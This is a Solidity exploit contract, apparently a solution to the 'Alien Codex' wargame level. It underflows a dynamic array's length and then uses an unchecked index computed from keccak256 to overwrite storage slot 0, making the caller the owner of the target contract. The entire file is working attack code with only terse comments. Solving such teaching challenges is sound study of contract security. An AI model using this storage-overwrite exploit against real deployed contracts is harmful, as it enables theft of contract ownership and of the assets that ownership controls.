// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns(address);
}

contract HackAlienCodex {
    constructor(IAlienCodex codex) {
        codex.make_contact();
        codex.retract();

        // first slot
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        // the slot we want is h + i = 0
        // so i = -h
        uint i;
        // disable underflow
        unchecked {
            i -= h;
        }
        codex.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(codex.owner() == msg.sender, "Hack failed");
    }
}